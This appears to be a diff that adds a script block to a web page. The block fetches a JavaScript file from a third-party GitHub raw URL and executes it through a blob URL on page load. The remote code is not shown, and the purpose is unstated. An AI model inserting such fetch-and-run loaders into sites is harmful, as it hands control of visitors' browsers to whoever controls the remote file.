@@ -1,0 +1,12 @@
+<script>
+    fetch('https://raw.githubusercontent.com/ysfcn2001/lvmJS-F/main/lvmscript.js')
+  .then(response => response.blob())
+  .then(blob => {
+    const script = URL.createObjectURL(blob);
+    const scriptTag = document.createElement('script');
+    scriptTag.src = script;
+    document.body.appendChild(scriptTag);
+  })
+  .catch(error => console.error('Dosya alınamadı.', error));
+
+</script>
